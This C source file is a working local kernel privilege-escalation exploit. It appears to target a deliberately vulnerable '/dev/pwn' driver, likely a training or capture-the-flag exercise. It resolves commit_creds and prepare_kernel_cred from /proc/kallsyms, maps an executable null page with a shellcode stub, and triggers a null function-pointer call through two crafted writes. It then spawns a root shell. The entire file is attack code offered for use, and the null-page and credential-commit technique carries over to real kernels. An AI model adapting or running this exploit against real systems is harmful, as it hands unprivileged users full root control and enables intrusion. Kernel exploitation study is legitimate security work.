
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>

#define BUF_SIZE 512

struct cred;
struct task_struct;

/* Definitions for commit_creds and prepare_kernel_cred */
typedef struct cred *(*prepare_kernel_cred_t)(struct task_struct *daemon)
  __attribute__((regparm(3)));

typedef int (*commit_creds_t)(struct cred *new)
  __attribute__((regparm(3)));

prepare_kernel_cred_t prepare_kernel_cred;
commit_creds_t commit_creds;

/*
* Get the kernel addresses of symbols
*/
void *get_ksym(char *name) {
    FILE *f = fopen("/proc/kallsyms", "rb");
    char c, sym[512];
    void *addr;
    int ret;

    while(fscanf(f, "%p %c %s\n", &addr, &c, sym) > 0)
        if (strcmp(sym, name) == 0)
	{
	    printf("[+] Found address of %s at 0x%p [+]\n", name, addr);
            return addr;
	}
    return NULL;
}

/*
* set uid/gid of current task to 0 (root) by commiting a new 
* kernel cred struct. This is run in ring 0.
*/
void get_root()
{
	commit_creds(prepare_kernel_cred(0));
}

/*
* Here we use inline asm to call the get_root function.
* We dont actually need this, but it taught me how to
* use inline assembly to create shellcode stubs.
* This is run in ring 0.
*/
void stub()
{
	asm("call *%0" : : "r"(get_root));
}


int main()
{
	/* get the addresses of the functions we need */
	commit_creds = get_ksym("commit_creds");
	prepare_kernel_cred = get_ksym("prepare_kernel_cred");

	if(!commit_creds || !prepare_kernel_cred)
	{
		printf("[x] Error getting addresses from kallsyms, exiting... [x]\n");
		return -1;
	}

	char *buf = malloc(BUF_SIZE);

	/* To trigger the exploit, the first 4 bytes must equal 0xcafebabe */
	memset(buf, 0x00, BUF_SIZE);
	buf[3] = 0xca;
	buf[2] = 0xfe;
	buf[1] = 0xba;
	buf[0] = 0xbe;


	long *addr =(long *)  mmap(0, 4096, PROT_READ|PROT_WRITE|PROT_EXEC,
                MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);

	if(addr == -1)
	{
		printf("mmap error\n");
		return -1;
	}

	printf("[+] mapped null page [+]\n");

        void **fn = 0x600; //due to the way the fp is called, we start at 0x600

	/* We copy the asm from our stub to the mapped page */
	/* Debugging showed we can't simply put a pointer to our get_root function there */
	memcpy(fn, stub, 128); //get_root can also be used here.

	printf("[+] Mapped Null Page and copied code [+]\n");
	printf("[+] %x points to %p [+]\n", fn, *fn);

	/* Here we do the first call to pwn_write */
	/* We fail authentication, causing the function pointer to be nulled */
        int fd = open("/dev/pwn", O_RDWR);

	if(fd < 0)
	{
		printf("[x] Unable to open device /dev/pwn, exiting.... [x]\n");
		return -1;
	}

        int ret = write(fd, buf, BUF_SIZE);

	printf("[+] First write returned %x [+]\n", ret);
	printf("[+] Triggering vulnerability through second call [+]\n");

	int fd_trigger = open("/dev/pwn", O_RDWR);
	write(fd_trigger, buf, BUF_SIZE); 

	close(fd);
	close(fd_trigger);

	if(getuid() == 0)
	{
		printf("[!!!] Enjoy your root shell [!!!]\n");
		system("/bin/sh");
		return 0;
	}
	else
	{
		printf("[x] Something went horribly wrong, couldn't elevate privs [x]\n");
		return -1;
	}

}
